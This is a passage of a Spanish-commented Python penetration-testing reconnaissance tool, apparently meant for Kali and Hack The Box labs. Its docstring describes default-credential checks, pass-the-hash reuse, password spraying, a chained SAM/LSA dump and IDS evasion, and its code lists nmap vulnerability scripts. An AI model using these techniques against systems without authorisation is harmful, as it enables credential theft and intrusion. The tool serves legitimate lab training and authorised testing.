#!/usr/bin/env python3
"""palantir.py — reconocimiento guiado por Nmap: descubrir → enumerar → banner → footprinting por protocolo → fuzz web/vhost → informe HTML.

«La piedra vidente que mira a lo lejos». Pensado para Kali. El núcleo es solo
stdlib de Python (subprocess, socket, ftplib, smtplib, xml.etree, json, html…);
las herramientas externas son opcionales y se saltan solas si no están:
  nmap (obligatorio), ffuf (fuzzing web), searchsploit (exploits conocidos), y
  para el footprinting por protocolo: smbclient/rpcclient/nxc/smbmap/enum4linux-ng
  (SMB), showmount (NFS), dig (DNS), whois (WHOIS), crt.sh (Certificate
  Transparency, github.com/az7rb/crt.sh), snmpwalk/onesixtyone (SNMP), tnscmd10g
  (Oracle), redis-cli (Redis), wafw00f (detección de WAF).

Fases (cada una alimenta a la siguiente; el número es el orden real en pantalla):
  1. Descubrimiento de puertos: barrido rápido de TODOS los puertos (-p-).
  2. Enumeración: -sV + scripts NSE curados SOLO sobre puertos abiertos. Nmap
     enruta cada script a su servicio por su portrule. --aggressive lanza un
     SEGUNDO nmap aparte con los scripts vuln (así un timeout no borra lo seguro).
  3. (opcional --udp) barrido UDP de los puertos que importan (SNMP, IPMI, …).
     Va aquí, justo DESPUÉS de la Fase 2 y ANTES del banner grabbing/footprinting,
     para que si hay SNMP/IPMI por UDP, la Fase 5 ya los tenga y pueda
     footprintearlos.
  4. Banner grabbing por socket propio: saca a la luz servicios que Nmap deja
     como 'unknown' (p. ej. un 31337 que responde 220 ...).
  5. Footprinting por protocolo: para cada servicio reconocido lanza la
     enumeración manual que enseña el path de HTB. Cada comando se imprime con
     su "por qué" (modo educativo) tanto en pantalla como en el informe HTML.
     Protocolos: FTP anónimo (ftplib + listado), SMB/RPC (smbclient/rpcclient +
     nxc con fallback null→guest→Administrator y, si es DC, enum AD de solo
     lectura: RID cycling, usuarios, grupos, equipos, pass-pol), NFS
     (showmount + nxc), DNS (dig + AXFR), SMTP (VRFY vía smtplib), IMAP/POP3,
     SNMP (snmpwalk public), MySQL, MSSQL (nxc, 'sa' sin contraseña), Oracle
     TNS, IPMI, Redis, LDAP (nxc con fallback + ldapsearch), WinRM/RDP/VNC/WMI
     (nxc con fallback), SSH, rsync, y mini-recon web/IIS (whatweb + wafw00f +
     nombres cortos 8.3 + WebDAV + .well-known/security.txt y
     openid-configuration). Si hay un dominio (descubierto o --vhost): WHOIS
     (registrador/fechas/NS) y Certificate Transparency vía crt.sh (subdominios
     reales confirmados por certificado, que alimentan la Fase 7 de vhost antes
     que el diccionario). nxc habla todos sus protocolos con el mismo fallback
     de credenciales por defecto. Todo solo-lectura y con credenciales por
     defecto (anónimo/null/guest/Administrator-sin-contraseña/sa/public) — UN
     intento por cuenta, nada de fuerza bruta de contraseñas ni escritura. Un sitio
     servido en varios puertos a la vez (80→443, 8080→8443…) se footprintea UNA sola
     vez: los puertos espejo se detectan antes y se saltan (ver Fase 6).
  5b. Exploits conocidos (searchsploit, OFFLINE): por cada product+version que
     detectó nmap, busca en la base local de exploit-db. Solo consulta; el match
     por versión es ruidoso → se marca como "verificar a mano".
  5c. Credenciales por defecto (VERIFICADAS): por cada servicio prueba SOLO las
     credenciales de fábrica/instalación conocidas (anónimo, root sin contraseña,
     sa/blank, scott/tiger, tomcat/tomcat, community 'public'…) y CONFIRMA el acceso
     (SELECT 1, PING, chassis status, carga del Manager…) para descartar falsos
     positivos. Lista corta y curada por servicio, UN intento por par, un objetivo:
     NO es fuerza bruta (hydra/medusa con diccionarios queda como sugerencia manual).
     Cubre FTP/SSH/SMB/WinRM/RDP/LDAP/WMI/VNC/MySQL/PostgreSQL/MSSQL/Redis/SNMP/
     Oracle/IPMI/Tomcat; MongoDB y Telnet como sugerencia. Con --default-creds es la
     ÚNICA fase que corre (se omiten footprint, searchsploit y fuzzing); --no-creds
     la desactiva.
  5d. Credenciales aportadas (reutilización): con --user/--pass (o --hash/-H para
     pass-the-hash), --user-list/-U + --pass-list/-P o --creds-file, reutiliza
     la(s) credencial(es) contra TODOS los servicios detectados con nxc. Una
     credencial válida por SMB/LDAP ENUMERA con ella (shares/usuarios/grupos/
     pass-pol/rid-brute, y roasting por LDAP; spidering de contenido con --spider),
     no solo prueba el login. Un (Pwn3d!) por SMB encadena además un volcado de
     SAM/LSA con esa misma credencial.
  5e. (opcional --nikto/--nuclei/--cms-scan/--crawl) escáneres web LENTOS: nikto/
     nuclei/wpscan/joomscan/katana, cada uno puede tardar VARIOS MINUTOS. Corren
     APARTE del footprint normal (5) y DESPUÉS del informe preliminar de la Fase 8
     — así nunca bloquean el primer vistazo al informe. Al terminar se reescribe
     el HTML (ya con sus hallazgos) antes del fuzzing. Si ninguno de los 4 flags
     está encendido, esta fase no hace nada (coste cero).
  6. Fuzzing web (ffuf) con extensiones deducidas del servidor (IIS→asp/aspx, …).
     Un sitio servido en varios puertos (80/443/8080/8443…) se trata como UNO solo:
     el espejo (el que solo redirige al otro) se detecta ANTES de footprintear (5)
     y se salta tanto ahí como aquí — nunca se repite el mismo sitio 2-4 veces.
  7. Vhost/subdominio fuzzing (Host: FUZZ.dominio). El dominio se descubre solo
     de los certificados/redirecciones/SMB, o se pasa con --vhost. Si la Fase 5
     sacó subdominios de crt.sh para ese dominio, se confirman primero (wordlist
     mínima, ya sabida por certificado) antes del diccionario grande.
  8. Informe: tabla ANSI en pantalla + <ip>/report.html (desplegables, tema
     ámbar, hallazgos por severidad, índice de salto a cada sección y botón de
     copiar en cada comando) + <ip>/report.md + <ip>/findings.json (máquina-legible).
     El PRELIMINAR se escribe en cuanto terminan footprint + exploits +
     credenciales, antes de los escáneres lentos (5e) y del fuzzing (la fase más
     larga): se auto-recarga cada 60 s y va creciendo con cada hallazgo; el
     definitivo (sin banner) lo sustituye al terminar, SIEMPRE, aunque
     interrumpas con Ctrl-C o un comando falle — nunca te quedas sin informe.

--jobs N: escanea N objetivos EN PARALELO (def. 1 = secuencial). Para un /24 o
  una lista grande. Cada objetivo corre en su hilo con su propio report.html/
  commands.log y sus líneas van etiquetadas [ip]; sin preguntas interactivas.

Al terminar CUALQUIER run (uno o varios objetivos) se actualiza <outdir>/
  index.html: una tabla con el link al report.html de cada objetivo que haya
  alguna vez en <outdir> (no solo los de este run), sus puertos/hallazgos y si
  falló (ver error.log) — acumulativo entre sesiones, para no entrar carpeta
  por carpeta cuando ya llevas varias máquinas escaneadas por separado.

--stealth (labs de sigilo, pensado para no disparar IDS/alertas obvias):
  nmap  → -T2 -f --data-length 24 (en vez de -T4 --min-rate a tope).
  ffuf  → menos hilos + delay entre peticiones + User-Agent de navegador normal.
  --proxy enruta ffuf (p. ej. por Burp).

--tunnel / --pivoting (escaneo a través de un pivot: ligolo-ng, chisel, SOCKS,
  sshuttle, ssh -D, Meterpreter, WSL2+VPN…): fuerza -sT, QUITA el --min-rate del
  nmap (su ritmo fijo satura la pila TCP userland del relay y nmap marca
  'filtered' puertos ABIERTOS cuyas respuestas se perdieron — p. ej. WinRM 5985
  por un ligolo-ng) y usa --max-retries 10 (el default de nmap, el que recupera
  esos probes). Baja el banner grabbing a 4 hilos (de 16) para no inundar el
  relay, y desactiva la Fase 0 (ping-sweep: el ICMP no cruza un pivot fiable).
  Mantiene el -p- completo (por un túnel tarda varios min pero no pierde puertos,
  ni los RPC dinámicos altos de un DC); con --top haces solo el top-1000
  (rápido). Mucho más rápido que --stealth y sin perder puertos.
  OJO: --tunnel SOLO ajusta el escaneo, NO enruta. Por RUTA (ligolo-ng crea una
  TUN L3, sshuttle hace NAT transparente) corres palantir normal y el SO enruta
  todo. Por SOCKS (chisel socks / ssh -D) envuelve TODO con `proxychains
  palantir …`; si no, solo ffuf con --proxy iría por el pivot. UDP y
  --source-port no sobreviven un salto SOCKS (sí por ruta/ligolo).

--source-port PUERTO: firewalls que confían en un puerto concreto (53/DNS es
  el clásico) dejan pasar paquetes que dicen venir de él. Se aplica a nmap Y
  al banner grabbing propio. Puertos <1024 requieren root.

Todo se guarda en <outdir>/<ip>/ (nmap/ + web/ + report.html + findings.json),
más un commands.log con cada comando ejecutado.

Uso:
    sudo ./palantir.py 10.129.21.27
    sudo ./palantir.py 10.129.21.27 --no-aggressive --no-udp   # más rápido/silencioso
    sudo ./palantir.py 10.129.21.27 --profile big --vhost inlanefreight.htb
    sudo ./palantir.py 10.129.21.27 --stealth --proxy http://127.0.0.1:8080
    ./palantir.py 172.16.119.7 --tunnel   # por un pivot (ligolo-ng/chisel/SOCKS): no pierde puertos
    ./palantir.py 10.129.21.27 --no-fuzz --no-html   # solo escaneo + footprint
    sudo ./palantir.py 10.129.21.27 --default-creds   # SOLO credenciales por defecto
    sudo ./palantir.py 10.129.21.27 --port 38490 --vhost inlanefreight.htb   # puerto ya conocido (lab de Virtual Hosts)
    sudo ./palantir.py 10.129.14.99 --vhost-names app.x.local,dev.x.local    # vhosts ya conocidos: directo a fingerprintear
    sudo ./palantir.py 10.129.21.27 --resume --user svc_admin --pass Passw0rd!   # sin re-escanear NI repetir footprint/searchsploit/creds por defecto (si no cambiaron los puertos): solo prueba la credencial nueva (Fase 5d)
    sudo ./palantir.py 10.129.21.27 --resume -U usuarios.txt -P contraseñas.txt  # cruza las dos listas (spraying de verdad, avisa si son grandes)
    ./palantir.py --selftest      # prueba los parsers sin tocar la red
"""

import argparse
import concurrent.futures
import html
import ipaddress
import json
import os
import re
import shlex
import shutil
import socket
import subprocess
import sys
import threading
import traceback
import unicodedata
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path

# ───────────────────────── Colores ─────────────────────────
if sys.stdout.isatty() and os.name == "posix" and not os.environ.get("NO_COLOR"):
    C_RESET, C_BOLD = "\033[0m", "\033[1m"
    C_RED, C_GREEN, C_YELLOW = "\033[31m", "\033[32m", "\033[33m"
    C_BLUE, C_CYAN, C_GREY = "\033[34m", "\033[36m", "\033[90m"
else:
    C_RESET = C_BOLD = C_RED = C_GREEN = C_YELLOW = C_BLUE = C_CYAN = C_GREY = ""

# ¿El terminal soporta truecolor (24-bit)? Lo usan el degradado del banner y box(style="grad");
# si no, caen a color plano. Lo PROPIO es mirar COLORTERM, pero muchos terminales que SÍ soportan
# truecolor no lo exportan (Kali deja COLORTERM sin poner y TERM=xterm-256color) — por eso, antes
# salía el wordmark en cian plano en vez de con el degradado. Se acepta también un TERM *-256color
# (gnome-terminal/xterm/kitty/tmux… hoy casi todos hacen truecolor) y algunos TERM conocidos; la
# consola Linux pura (TERM=linux, sin truecolor) queda fuera → se queda en color plano, correcto.
def _detect_truecolor():
    if not C_RESET:
        return False
    if os.environ.get("COLORTERM", "").lower() in ("truecolor", "24bit"):
        return True
    term = os.environ.get("TERM", "")
    return "256color" in term or "truecolor" in term or term in ("xterm-kitty", "xterm-ghostty", "wezterm", "foot")


_TRUECOLOR = _detect_truecolor()


def info(m): print(f"{C_CYAN}[*]{C_RESET} {m}", flush=True)
def good(m): print(f"{C_GREEN}[+]{C_RESET} {m}", flush=True)
def warn(m): print(f"{C_YELLOW}[!]{C_RESET} {m}", flush=True)
def err(m):  print(f"{C_RED}[-]{C_RESET} {m}", file=sys.stderr, flush=True)
def why(m):  print(f"{C_GREY}    ↳ por qué: {m}{C_RESET}", flush=True)   # explica el comando (modo educativo)


_ANSI_RE = re.compile(r"\033\[[0-9;]*m")

# ⏱ STOPWATCH (U+23F1): se intentó una vez contarlo como ancho 2 (asumiendo que, por llevar
# Emoji_Presentation=Sí, las terminales con fuente de emoji lo pintan a 2 columnas igual que
# 📄). Un informe real posterior mostró justo lo CONTRARIO en otra terminal: ⏱ se pinta a 1
# columna (su East-Asian-Width real, 'N' de Narrow, SIN forzar presentación emoji con
# U+FE0F) y forzarlo a 2 descuadraba el borde derecho en esa fila 1 columna hacia la
# izquierda — el mismo síntoma ("borde movido") que el hack pretendía arreglar, pero en
# sentido opuesto. Como el ancho real de ⏱ depende de la fuente/terminal y no hay forma de
# adivinarlo bien para todo el mundo, la fila que lo usaba (el tiempo transcurrido del
# RESUMEN) ya no lleva ningún emoji de ancho ambiguo — así _char_width solo necesita fiarse
# de unicodedata.east_asian_width ('W'/'F', inequívocamente anchos: 📄 sigue siendo 2 sin
# ningún hack) y no hace falta ninguna lista de excepciones.
def _char_width(ch):
    """Ancho en COLUMNAS de terminal de un carácter (ya sin su ANSI, eso lo quita quien llama):
    0 para marcas de ancho cero (combinantes, el selector de variación emoji U+FE0F, ZWJ…) que
    se montan sobre el carácter anterior sin mover el cursor; 2 para CJK/emoji
    inequívocamente anchos (unicodedata.east_asian_width 'W'/'F', p.ej. 📄); 1 para el resto,
    incluidos los símbolos de ancho 'ambiguo' (★, ⏱…) cuyo render en pantalla varía según
    terminal/fuente y por eso NO se intenta adivinar a 2. Contar codepoints a secas (como
    hacía antes _vis_len con len()) infraestima los anchos inequívocos y descuadra el borde
    derecho de la caja en las filas que los usan."""
    if ch == "️" or unicodedata.combining(ch) or unicodedata.category(ch) in ("Mn", "Me", "Cf"):
        return 0
    if unicodedata.east_asian_width(ch) in ("W", "F"):
        return 2
    return 1


def _vis_len(s):
    """Longitud VISIBLE en COLUMNAS de terminal: descuenta los códigos ANSI y pesa cada
    carácter por su ancho real (_char_width), no por cuenta de codepoints — un emoji/CJK
    inequívocamente ancho (📄…) contado como 1 dejaba el borde derecho de la caja
    descuadrado."""
    return sum(_char_width(ch) for ch in _ANSI_RE.sub("", s))


def _vis_trunc(s, n):
    """Trunca `s` a un ancho VISIBLE de n COLUMNAS (cuenta cada carácter por _char_width, no
    por codepoint) preservando los códigos ANSI y cerrando con … + reset. Así una ruta o un
    comando largo —con o sin emoji anchos— nunca rompe el marco."""
    if _vis_len(s) <= n:
        return s
    out, vis, i, budget = [], 0, 0, n - 1   # -1: deja hueco para el …
    while i < len(s):
        m = _ANSI_RE.match(s, i)
        if m:
            out.append(m.group()); i = m.end(); continue
        w = _char_width(s[i])
        if vis + w > budget:
            break
        out.append(s[i]); vis += w; i += 1
    return "".join(out) + "…" + C_RESET


def _vis_wrap(s, n):
    """Parte `s` en líneas de <=n COLUMNAS visibles (pesa cada carácter por _char_width, no por
    codepoint) preservando ANSI, para que un comando/ruta largo quepa ENTERO dentro de una caja
    cerrada (en vez de truncarse con …): reabre en cada línea los códigos de color en vigor y
    cierra con reset, así el color no se pierde en las continuaciones y el marco sigue
    cuadrando. Rompe por el último espacio si lo hay (soft-wrap); si una 'palabra' es más
    larga que n, corta en seco.
    El corte se decide ANTES de añadir cada carácter (no después): con un carácter ANCHO (2
    columnas) justo en el punto de corte y sin espacio cercano (corte en seco), cerrar el trozo
    DESPUÉS de añadirlo podía dejar esa fila en n+1 columnas — 1 más de lo que cabía en la
    caja — porque ese carácter ya estaba dentro cuando se detectaba el desborde."""
    if _vis_len(s) <= n:
        return [s]
    out, active, start, cur, vis, space_at, i = [], [], "", [], 0, -1, 0
    while i < len(s):
        m = _ANSI_RE.match(s, i)
        if m:
            code = m.group()
            cur.append(code)
            if code in ("\033[0m", C_RESET):
                active = []
            else:
                active.append(code)
            i = m.end(); continue
        w = _char_width(s[i])
        if vis + w > n and vis > 0:   # vis>0: no partir en seco ANTES del 1er carácter de la fila
            head, tail = (cur[:space_at], cur[space_at:]) if 0 < space_at < len(cur) else (cur, [])
            out.append(start + "".join(head).rstrip() + C_RESET)
            start, cur, vis, space_at = "".join(active), tail, _vis_len("".join(tail)), -1
        cur.append(s[i]); vis += w
        if s[i] == " ":
            space_at = len(cur)
        i += 1
    if cur:
        out.append(start + "".join(cur).rstrip() + C_RESET)
    return out


_BOX_MAXW_CAP = 100   # tope de ancho de caja: en un terminal muy ancho, cajas de 180 columnas
                      # con contenido corto cansan; 100 es legible y alinea todo igual.


def _box_inner():
    """Ancho interior CONSTANTE de las cajas en este run: ancho del terminal acotado al tope,
    menos los 4 chars del marco (│␣␣␣│). Estable mientras no cambie el terminal → todas las
    cajas se alinean (ver box()).
    NUNCA más ancho que la terminal REAL que informa shutil.get_terminal_size(): antes había un
    suelo de 40 columnas que ganaba incluso a una terminal real más estrecha (un panel de tmux
    partido, una app SSH de móvil, cualquier cosa por debajo de 40 cols) — la caja salía más
    ancha que la pantalla, la terminal la envolvía sola y el marco se descuadraba exactamente
    igual que el bug de los emoji anchos (mismo síntoma, causa distinta). El suelo de 10 aquí es
    solo defensivo, para no dejar `inner` en 0/negativo si algo informa un tamaño absurdo — con
    una terminal así de estrecha de verdad no hay mucho más que hacer salvo no reventar."""
    cols = min(shutil.get_terminal_size((100, 24)).columns, _BOX_MAXW_CAP)
    return max(10, cols - 4)


def box(lines, title="", color=None, style="simple", wrap=False):
    """Enmarca `lines` (ya coloreadas) en una caja. style: 'simple'|'double'|'grad'.
    - El ancho se mide SIN códigos ANSI y se acota al ancho del terminal; las
      líneas más largas se truncan con … (el marco nunca descuadra).
    - `wrap=True`: en vez de truncar, PARTE las líneas largas en varias (soft-wrap,
      ver _vis_wrap) para que un comando/ruta quepa ENTERO dentro del marco cerrado
      — se usa en quick wins, donde el comando copiable no debe perderse. (El marco
      sigue cuadrando; para copiar sin los bordes ║, el comando completo también
      está en report.html.)
    - 'grad' pinta el borde con un degradado rojo→ámbar si hay truecolor; si no,
      usa `color` plano.
    - En no-tty (C_*='') sale en ASCII box-drawing, sin color, listo para un log."""
    if color is None:
        color = C_CYAN
    # Ancho CONSTANTE para TODAS las cajas de un run (acotado al terminal y a un tope): antes
    # cada caja se ajustaba a su propio contenido (inner = min(maxw, len del contenido)), así
    # que unas salían anchas y otras estrechas y la pantalla se veía "movida" (bordes bailando).
    # Ahora todas comparten ancho → se alinean verticalmente (como en adscan). El contenido más
    # corto se rellena; el más largo se trunca (o se parte con wrap=True).
    inner = _box_inner()
    title = _vis_trunc(title, inner - 6)   # deja hueco para '╭─ ' + ' ─…─╮' (si no, descuadra 1)
    if wrap:
        wrapped = []
        for l in lines:
            wrapped.extend(_vis_wrap(l, inner))
        lines = wrapped
    else:
        lines = [_vis_trunc(l, inner) for l in lines]
    double = style == "double"
    grad = style == "grad" and _TRUECOLOR
    tl, tr, bl, br, hz, vt = ("╔", "╗", "╚", "╝", "═", "║") if double else ("╭", "╮", "╰", "╯", "─", "│")
    bold = C_BOLD if double else ""
    c = ("\033[38;2;255;170;0m" if grad else color) + bold
    if grad:
        # Degradado rojo→ámbar en el borde superior Y en el inferior, en la MISMA dirección
        # (izquierda→derecha) en los dos: las esquinas IZQUIERDAS (tl/bl) siempre se pintan con
        # c_l (rojo) y las DERECHAS (tr/br) siempre con c_r (ámbar) — fijo, no cambia entre techo
        # y suelo. Antes el suelo iba ESPEJADO (ámbar→rojo), razonando que así "encajaría" con
        # esas mismas esquinas — y lograba justo lo contrario: el primer carácter del suelo
        # nacía en ámbar pegado a una esquina ROJA (bl), y el último en rojo pegado a una esquina
        # ÁMBAR (br) — un salto de color visible en las DOS esquinas inferiores (confirmado
        # muestreando los píxeles de una captura real: el suelo medía amber→red de izq. a
        # derecha, justo al revés que el techo). Con el suelo en la MISMA dirección que el techo
        # (bottom = top), cada esquina nace ya en su propio color: un lazo de color continuo de
        # verdad, sin saltos en ninguna de las 4 esquinas.
        n = inner + 2
        def _grad_rgb(i):
            return (214 + 41 * i // (n - 1), 40 + 130 * i // (n - 1), 40 - 40 * i // (n - 1))
        top = "".join("\033[38;2;%d;%d;%dm" % _grad_rgb(i) + hz for i in range(n))
        bottom = top
        c_l = "\033[38;2;%d;%d;%dm" % _grad_rgb(0) + bold         # rojo: esquina/lateral izquierdo
        c_r = "\033[38;2;%d;%d;%dm" % _grad_rgb(n - 1) + bold     # ámbar: esquina/lateral derecho
        print(f"{c_l}{tl}{C_RESET}{top}{c_r}{tr}{C_RESET}")
        if title:
            print(f"{c_l}{vt}{C_RESET} {bold}{c_r}{title}{C_RESET}{' ' * (inner - _vis_len(title))} {c_r}{vt}{C_RESET}")
        for l in lines:
            print(f"{c_l}{vt}{C_RESET} {l}{' ' * (inner - _vis_len(l))} {c_r}{vt}{C_RESET}")
        print(f"{c_l}{bl}{C_RESET}{bottom}{c_r}{br}{C_RESET}")
        return
    if title:
        print(f"{c}{tl}{hz} {C_BOLD}{title}{C_RESET}{c} " + hz * (inner - _vis_len(title) - 1) + f"{tr}{C_RESET}")
    else:
        print(f"{c}{tl}" + hz * (inner + 2) + f"{tr}{C_RESET}")
    for l in lines:
        print(f"{c}{vt}{C_RESET} {l}{' ' * (inner - _vis_len(l))} {c}{vt}{C_RESET}")
    print(f"{c}{bl}" + hz * (inner + 2) + f"{br}{C_RESET}")


def callout(lines, title="", color=None):
    """Variante sin borde derecho (barra lateral ┃). NO trunca, así preserva
    comandos/rutas completos y copiables. Alternativa a box() para quick wins."""
    col = (color or C_CYAN) + C_BOLD
    if title:
        print(f"{col}┃{C_RESET} {col}{title}{C_RESET}")
    for l in lines:
        print(f"{col}┃{C_RESET} {l}")


def phase(title, why=None, color=None):
    """Cabecera de FASE en caja (ancho constante, alineada con el resto de cajas del run) —
    sustituye al viejo `info("Fase N — …")` suelto. El *por qué* (modo educativo) va como
    única línea del cuerpo, en gris, dentro de la misma caja; sin él, la caja lleva solo el
    título. Reemplaza al par info()+why() de cada fase. wrap=True: el 'por qué' se PARTE en
    varias líneas en vez de truncarse con … — con cajas de ~100 columnas de ancho, una
    explicación de una frase se cortaba a media palabra en casi todas las fases."""
    body = [f"{C_GREY}↳ {why}{C_RESET}"] if why else []
    box(body, title=title, color=color or C_CYAN, wrap=True)


# El orbe del banner: un núcleo de fuego brillante y ASIMÉTRICO (como si girara) en vez
# del degradado perfectamente concéntrico de la v1, con una rendija vertical OSCURA en
# medio — el Ojo de Sauron es un hueco en el fuego, no el punto más caliente (la lente se
# fuerza a '.', el nivel más oscuro de la escala, igual que el borde exterior; nunca a
# '*'/'#'/'%'). La rendija termina en un único punto arriba y abajo (una sola celda de
# ancho justo en el extremo, luego ancho completo de golpe en la fila siguiente — no un
# estrechamiento gradual fila a fila) y ese punto se queda corto del borde del orbe, para
# que quede fuego sólido entre la punta y el borde. El radio usa un factor de aspecto
# (fila:columna) algo mayor que el de "una fila = dos columnas" de libro, calibrado contra
# una captura real en Kali (el orbe salía ~5% más alto que ancho con ese valor de libro) —
# sigue siendo una aproximación, no una medida de CADA terminal/fuente posible. La
# asimetría sale de sesgar el nivel de cada celda con dos brazos de espiral (un seno de
# ángulo+radio, amplitud ±1 nivel) ANTES de mapear a carácter — nunca se introduce un
# símbolo nuevo fuera de la escala de siempre, así que sigue siendo SOLO los 8
# símbolos/colores de siempre, generado offline y
# pegado aquí como literal estático (palantir sigue sin dependencias, esto no se recalcula
# en tiempo de ejecución). Se descartaron dos intentos previos: uno con color de 24 bits
# por celda (medio-bloque) que dependía de la fuente/métrica de cada terminal (se veía
# ovalado y con la rendija mal en una terminal real) y uno con texturas de ruido/símbolos
# nuevos ('/','\') que quedaba ruidoso y sin color por no estar en _ORB_COLORS.
_ORB_COLORS = {
    ".": C_GREY,                                   # el anillo exterior Y la rendija del Ojo
    ":": C_BOLD + C_RED, "-": C_BOLD + C_RED,       # (mismo símbolo, mismo gris oscuro: el
    "=": C_BOLD + C_RED, "+": C_BOLD + C_RED,       # Ojo es un hueco, no una marca aparte)
    "*": C_BOLD + C_YELLOW, "#": C_BOLD + C_YELLOW,  # rojo→ámbar en el mismo orden de
    "%": C_BOLD + C_YELLOW,                          # siempre ('.: -=+ *#%'), de frío a
    "o": C_BOLD + C_RED,                             # caliente; 'o' ya no lo usa el arte
}                                                     # nuevo, se deja por compatibilidad.

# Orbe (el palantír) — solo el orbe; el wordmark va al lado, ver _build_banner.
_ORBE_ART = r"""
         .......
     ...:::::::::...
  ...::====+++=---::...
 ..::--===++.**++=--::..
..:----===+...****==:::..
.::---==**#...###*+=-:::.
.:-:--+*#%#...#%#*+--:-:.
.:::-=+*###...#**==---::.
..:::==****...+===----:..
 ..::--=++**.++===--::..
  ...::---=+++====::...
     ...:::::::::...
         .......
"""
# Wordmark "palantir" en bloque 3D (figlet ANSI Shadow): las caras son '█' y las aristas
# del extruido son '═║╔╗╚╝'. A juego con la otra tool del autor (GROND). Generado con
# pyfiglet (solo para GENERAR este arte — palantir sigue siendo solo-stdlib: esto es un
# literal estático).
_WORDMARK_ART = r"""
██████╗  █████╗ ██╗      █████╗ ███╗   ██╗████████╗██╗██████╗
██╔══██╗██╔══██╗██║     ██╔══██╗████╗  ██║╚══██╔══╝██║██╔══██╗
██████╔╝███████║██║     ███████║██╔██╗ ██║   ██║   ██║██████╔╝
██╔═══╝ ██╔══██║██║     ██╔══██║██║╚██╗██║   ██║   ██║██╔══██╗
██║     ██║  ██║███████╗██║  ██║██║ ╚████║   ██║   ██║██║  ██║
╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝╚═╝  ╚═╝
"""
_WORDMARK_COLOR = C_BOLD + C_CYAN   # fallback sin truecolor: cian plano (el 3D se ve por la forma)
_WM_FACE_TOP = (247, 255, 255)      # degradado de la cara '█': casi BLANCO arriba…
_WM_FACE_BOT = (20, 224, 248)       # …cian saturado abajo (el blanco→cian del wordmark de GROND)
_WM_EDGE = (36, 178, 198)           # aristas del extruido ('═║╔╗╚╝'): cian LUMINOSO = contorno neón 3D


def _wm_color(ch, row, nrows):
    """Color de un carácter del wordmark 3D: la cara '█' con un degradado vertical (por fila,
    blanco→cian), las aristas del extruido en cian luminoso (contorno neón, como GROND).
    Sin truecolor cae a cian plano."""
    if not ch.strip():
        return ""
    if not _TRUECOLOR:
        return _WORDMARK_COLOR
    if ch == "█":
        t = row / max(1, nrows - 1)
        rgb = tuple(round(_WM_FACE_TOP[k] + (_WM_FACE_BOT[k] - _WM_FACE_TOP[k]) * t) for k in range(3))
        return "\033[1;38;2;%d;%d;%dm" % rgb
    return "\033[38;2;%d;%d;%dm" % _WM_EDGE


def _build_banner():
    """Compone el banner: orbe (coloreado por _ORB_COLORS) a la izquierda y el wordmark 3D
    (degradado, _wm_color) a la derecha, centrado en vertical contra el orbe. En no-tty sale
    en ASCII plano sin color (C_*='' y _TRUECOLOR=False → los helpers devuelven ''), listo
    para un log/redirección."""
    orbe = _ORBE_ART.strip("\n").split("\n")
    wm = _WORDMARK_ART.strip("\n").split("\n")
    ow = max(len(l) for l in orbe)
    pad = (len(orbe) - len(wm)) // 2   # centra el wordmark en vertical contra el orbe
    rows = []
    for i, ol in enumerate(orbe):
        line = "".join((_ORB_COLORS[c] + c + C_RESET) if _ORB_COLORS.get(c) else c
                       for c in ol.ljust(ow))
        j = i - pad
        if 0 <= j < len(wm):
            line += "   "   # separación orbe↔wordmark
            for c in wm[j]:
                col = _wm_color(c, j, len(wm))
                line += (col + c + C_RESET) if col else c
        rows.append(line.rstrip() if not C_RESET else line)
    return "\n" + "\n".join(rows) + "\n"


BANNER = _build_banner()

# ───────────────────────── Scripts NSE ─────────────────────────
# Nombres verificados contra /usr/share/nmap/scripts. Nmap ejecuta cada script
# solo donde su portrule encaja, así que da igual pasarlos todos juntos.
SCRIPTS_DEFAULT = [
    "banner",
    "ssh2-enum-algos", "ssh-auth-methods", "ssh-hostkey",
    "http-title", "http-headers", "http-methods", "http-robots.txt",
    "http-server-header", "http-enum", "http-favicon", "http-git",
    "http-webdav-scan", "http-generator",
    "ssl-cert", "ssl-enum-ciphers",
    "ftp-anon", "ftp-syst", "ftp-bounce",
    "smtp-commands", "smtp-ntlm-info",
    "pop3-capabilities", "imap-capabilities",
    "smb-os-discovery", "smb-protocols", "smb-security-mode",
    "smb2-security-mode", "smb2-capabilities", "smb-enum-shares",
    "smb-enum-domains", "nbstat",
    "dns-nsid", "dns-recursion",
    "mysql-info", "ms-sql-info", "oracle-tns-version",
    "redis-info", "mongodb-info",
    "rdp-ntlm-info", "rdp-enum-encryption",
    "rpcinfo", "ldap-rootdse", "nfs-showmount", "rsync-list-modules",
    "finger",
]
# Vuln/backdoor: solo con --aggressive, en un nmap APARTE. Sin dos/unsafe, sin
# http-slowloris-check (espera 10s fijos) ni vulners (manda datos a una API).
SCRIPTS_AGGRESSIVE = [
    "smb-vuln-ms17-010", "smb-double-pulsar-backdoor",
    "http-shellshock", "http-vuln-cve2017-5638", "http-vuln-cve2015-1635", "http-put",
    "ftp-vsftpd-backdoor", "ftp-proftpd-backdoor",
    "smtp-open-relay",
    "ssl-heartbleed", "ssl-poodle", "ssl-ccs-injection",
    "rdp-vuln-ms12-020",
]

_SC = "/usr/share/seclists/Discovery/Web-Content"
WORDLIST_PROFILES = {
    "quick":  [f"{_SC}/raft-small-directories.txt"],
    "medium": [f"{_SC}/raft-medium-directories.txt"],
    "big":    [f"{_SC}/DirBuster-2007_directory-list-2.3-medium.txt",
               f"{_SC}/raft-medium-files.txt"],
}
WORDLIST_FALLBACK = "/usr/share/wordlists/dirb/common.txt"
WORDLIST_ALWAYS = "/usr/share/wordlists/dirb/big.txt"  # se añade siempre salvo --no-big-wordlist
DNS_WORDLIST = "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
# Wordlist de community strings para onesixtyone (SNMP), si existe.
SNMP_WORDLIST = "/usr/share/seclists/Discovery/SNMP/snmp.txt"
# Wordlist para el kerbrute userenum (Fase 5): None = modo automático (lista pequeña de
# seclists); --userenum-wordlist la fija a una concreta (de cualquier tamaño). Ver _userenum_wordlist.
USERENUM_WORDLIST = None
NO_USERENUM = False   # --no-userenum: no ejecutar kerbrute userenum (solo dejarlo como sugerencia)
# --spray: contraseña(s) para el password spraying AUTOMÁTICO contra los usuarios AD descubiertos
# en vivo (ad_users.txt). None = desactivado; lista de contraseñas si se da. Ver _spray_phase.
SPRAY_PASSWORDS = None

# Puertos UDP que de verdad importan en labs (lista explícita: --top-ports UDP no
# es portable entre versiones de nmap y puede saltarse el 623/IPMI).
